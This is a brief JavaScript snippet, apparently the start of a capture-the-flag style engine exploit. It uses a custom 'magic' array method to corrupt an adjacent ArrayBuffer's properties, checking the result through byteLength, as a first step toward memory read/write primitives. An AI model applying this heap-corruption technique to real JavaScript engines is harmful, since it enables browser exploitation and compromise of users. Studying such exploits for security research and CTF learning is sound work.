// Based on analysis: corrupt properties to get primitives  
const N = 73;
let arr = [1.1, 2.2];
for (let i = 0; i < N; i++) arr['p' + i] = i;
let ab = new ArrayBuffer(0x100);
arr.magic(arr.length, 43);
console.log("byteLength:", ab.byteLength);
